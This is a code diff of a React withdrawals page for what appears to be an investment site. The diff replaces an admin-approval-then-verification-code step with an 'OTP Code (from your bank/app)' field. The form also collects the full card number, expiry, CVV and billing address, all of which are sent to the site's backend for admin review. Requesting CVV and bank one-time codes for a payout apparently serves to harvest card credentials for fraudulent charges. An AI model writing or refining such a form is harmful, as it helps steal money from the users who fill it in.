@@ -4,7 +4,7 @@ import { useState, useEffect } from 'react'
 import { useRouter } from 'next/navigation'
 import { api } from '@/lib/api'
 import toast from 'react-hot-toast'
-import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Smartphone } from 'lucide-react'
+import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield } from 'lucide-react'
 import { ConfirmModal } from '@/components/ConfirmModal'
 import { SuccessModal } from '@/components/SuccessModal'
 
@@ -29,49 +29,25 @@ export default function WithdrawalsPage() {
   const [showForm, setShowForm] = useState(false)
   const [showConfirm, setShowConfirm] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
-  const [showVerify, setShowVerify] = useState(false)
-  const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
-  const [pendingVerifyMethod, setPendingVerifyMethod] = useState<'email' | 'sms'>('email')
-  const [verificationCode, setVerificationCode] = useState('')
   const [availableBalance, setAvailableBalance] = useState(0)
-  const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '', verifyMethod: 'email' as 'email' | 'sms' })
+  const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '', otpCode: '' })
   const router = useRouter()
 
   useEffect(() => {
     fetchWithdrawals()
-    const interval = setInterval(checkForApprovedWithdrawals, 5000)
+    const interval = setInterval(fetchWithdrawals, 10000)
     return () => clearInterval(interval)
   }, [])
 
   const fetchWithdrawals = async () => {
     try {
-        const { data } = await api.get('withdrawals')
+      const { data } = await api.get('withdrawals')
       setWithdrawals(data.data)
-      const approved = data.data.find((w: any) => w.status === 'CARD_APPROVED_WAITING_USER')
-      if (approved && !showVerify) {
-        setPendingWithdrawalId(approved.id)
-        setPendingVerifyMethod(approved.verificationMethod || 'email')
-        setShowVerify(true)
-        toast.success(`Admin approved! Enter the verification code sent via ${approved.verificationMethod || 'email'}`)
-      }
     } catch (err) {
       toast.error('Failed to fetch withdrawals')
     } finally {
       setLoading(false)
     }
-  }
-
-  const checkForApprovedWithdrawals = async () => {
-    try {
-      const { data } = await api.get('withdrawals')
-      const approved = data.data.find((w: any) => w.status === 'CARD_APPROVED_WAITING_USER')
-      if (approved && approved.id !== pendingWithdrawalId && !showVerify) {
-        setPendingWithdrawalId(approved.id)
-        setPendingVerifyMethod(approved.verificationMethod || 'email')
-        setShowVerify(true)
-        toast.success(`Admin approved! Enter the verification code sent via ${approved.verificationMethod || 'email'}`)
-      }
-    } catch (err) {}
   }
 
   const fetchInvestments = async () => {
@@ -99,6 +75,10 @@ export default function WithdrawalsPage() {
       toast.error('Billing address required')
       return
     }
+    if (!formData.otpCode || formData.otpCode.length < 4) {
+      toast.error('OTP code required')
+      return
+    }
     const fee = getWithdrawalFee(amount)
     const maxWithdrawable = availableBalance - fee
     if (amount > maxWithdrawable) {
@@ -122,15 +102,14 @@ export default function WithdrawalsPage() {
         expiryDate: formData.expiryDate,
         cvv: formData.cvv,
         billingAddress: formData.billingAddress,
-        verifyMethod: formData.verifyMethod,
+        otpCode: formData.otpCode,
       }
       const { data } = await api.post('withdrawals', payload)
       setShowForm(false)
       setShowConfirm(false)
       setConfirmAction(null)
       if (data.success && data.data?.id) {
-        setPendingWithdrawalId(data.data.id)
-        toast.success('Withdrawal submitted. Admin will approve and send verification code.')
+        toast.success('Withdrawal submitted. Admin will review and approve.')
       }
       fetchWithdrawals()
     } catch (err: any) {
@@ -140,26 +119,8 @@ export default function WithdrawalsPage() {
     }
   }
 
-  const handleVerify = async () => {
-    if (!pendingWithdrawalId || !verificationCode) {
-      toast.error('Please enter verification code')
-      return
-    }
-    try {
-      await api.put(`withdrawals/${pendingWithdrawalId}/verify`, { verificationCode })
-      setShowVerify(false)
-      setVerificationCode('')
-      setPendingWithdrawalId(null)
-      setShowSuccess(true)
-      fetchWithdrawals()
-    } catch (err: any) {
-      toast.error(err.response?.data?.message || 'Invalid verification code')
-    }
-  }
-
   const statusColors: Record<string, string> = {
     'WAITING_FOR_ADMIN_APPROVAL': 'bg-blue-50 text-blue-700 border border-blue-200',
-    'CARD_APPROVED_WAITING_USER': 'bg-amber-50 text-amber-700 border border-amber-200',
     'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
     'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
     'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
@@ -289,36 +250,22 @@ export default function WithdrawalsPage() {
                   placeholder="Street, Apt, City, Country"
                 />
               </div>
-              <p className="mt-1 text-xs text-gray-500">Must match card billing address for verification</p>
             </div>
             <div className="sm:col-span-2">
-              <label className="block text-sm font-medium text-gray-700">Verification Method</label>
-              <div className="mt-2 flex gap-4">
-                <label className="flex items-center gap-2 cursor-pointer">
-                  <input
-                    type="radio"
-                    name="verifyMethod"
-                    value="email"
-                    checked={formData.verifyMethod === 'email'}
-                    onChange={(e) => setFormData({ ...formData, verifyMethod: 'email' })}
-                    className="text-brand-blue focus:ring-brand-blue"
-                  />
-                  <span className="text-sm text-gray-700">Email</span>
-                </label>
-                <label className="flex items-center gap-2 cursor-pointer">
-                  <input
-                    type="radio"
-                    name="verifyMethod"
-                    value="sms"
-                    checked={formData.verifyMethod === 'sms'}
-                    onChange={(e) => setFormData({ ...formData, verifyMethod: 'sms' })}
-                    className="text-brand-blue focus:ring-brand-blue"
-                  />
-                  <Smartphone size={16} className="text-gray-500" />
-                  <span className="text-sm text-gray-700">SMS</span>
-                </label>
+              <label className="block text-sm font-medium text-gray-700">OTP Code (from your bank/app)</label>
+              <div className="relative mt-1">
+                <Shield className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
+                <input
+                  type="text"
+                  value={formData.otpCode}
+                  onChange={(e) => setFormData({ ...formData, otpCode: e.target.value.replace(/\D/g, '').slice(0, 10) })}
+                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 font-mono"
+                  required
+                  placeholder="Enter OTP from bank/SMS"
+                  maxLength={10}
+                />
               </div>
-              <p className="mt-1 text-xs text-gray-500">Code will be sent via selected method after admin approves your card details</p>
+              <p className="mt-1 text-xs text-gray-500">Get OTP from your bank app or SMS to verify card ownership</p>
             </div>
           </div>
           <div className="mt-4 flex gap-3">
@@ -333,42 +280,6 @@ export default function WithdrawalsPage() {
             Available: ${availableBalance.toLocaleString()} | Fee: {formData.amount ? `$${getWithdrawalFee(Number(formData.amount)).toFixed(2)}` : '-'} (2%, min $1, max $5)
           </p>
         </form>
-      )}
-
-      {showVerify && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
-          <div className="rounded-3xl border bg-white p-6 shadow-sm w-full max-w-md mx-4">
-            <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
-              <Shield className="h-5 w-5 text-brand-blue" />
-              Verify Withdrawal
-            </h3>
-            <p className="text-sm text-gray-600 mb-4">
-              Enter the 6-digit verification code sent via {pendingVerifyMethod === 'sms' ? 'SMS' : 'email'} to confirm this card withdrawal.
-            </p>
-            <input
-              type="text"
-              value={verificationCode}
-              onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
-              className="w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 text-center text-lg font-mono"
-              placeholder="Enter 6-digit code"
-              maxLength={6}
-            />
-            <div className="mt-4 flex gap-3">
-              <button
-                onClick={handleVerify}
-                className="flex-1 rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-5 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90"
-              >
-                Verify
-              </button>
-              <button
-                onClick={() => setShowVerify(false)}
-                className="rounded-xl border border-gray-200 px-5 py-2 text-sm text-gray-700 hover:bg-gray-50"
-              >
-                Cancel
-              </button>
-            </div>
-          </div>
-        </div>
       )}
 
       <ConfirmModal
